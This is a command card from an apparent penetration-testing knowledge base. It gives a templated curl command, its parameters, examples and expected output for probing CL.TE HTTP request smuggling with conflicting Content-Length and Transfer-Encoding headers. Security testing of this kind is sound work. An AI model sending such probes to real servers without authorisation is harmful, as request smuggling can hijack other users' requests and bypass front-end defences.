---
id: 7eb1fb0f-83d9-42c1-893c-3e10f1eb482b
name: curl-send-prefix-request
type: command
executor: bash
data: >-
  curl -X POST -H "Host: $_TARGET_HOST" -H "Content-Length: $_CL_VALUE" -H
  "Transfer-Encoding: chunked" -d "$_PREFIX_BODY" $_TARGET_URL
output: null
created_at: '2023-04-06T03:56:31.949660+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
  - macOS
tags:
  - http
  - request-smuggling
verified: true
validated: true
---

# curl-send-prefix-request

## Command

```bash
curl -X POST -H "Host: $_TARGET_HOST" -H "Content-Length: $_CL_VALUE" -H "Transfer-Encoding: chunked" -d "$_PREFIX_BODY" $_TARGET_URL
```

## Description

Sends a prefix HTTP request with conflicting CL and TE headers to test for CL.TE smuggling vulnerability. The body should be shorter than the CL value to leave the connection open for smuggling.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_HOST | Target hostname (e.g., target.com) | Yes |
| $_CL_VALUE | Content-Length value (e.g., 10) | Yes |
| $_PREFIX_BODY | Short body for prefix request (length < CL) | Yes |
| $_TARGET_URL | Full URL of vulnerable endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -H "Host: example.com" -H "Content-Length: 10" -H "Transfer-Encoding: chunked" -d "test" https://example.com/login
```

### Advanced Usage

Add verbose output for debugging:

```bash
curl -v -X POST -H "Host: example.com" -H "Content-Length: 15" -H "Transfer-Encoding: chunked" -d "prefix data here" https://example.com/api
```

## Expected Output

A partial response or hang indicating the back-end is waiting for more data in chunked mode. Successful vulnerability: HTTP 200 with incomplete body or error on subsequent requests.

## Related

- [[procedures/Perform-CL.TE-HTTP-Request-Smuggling]]
- [[commands/curl-send-smuggled-request]]
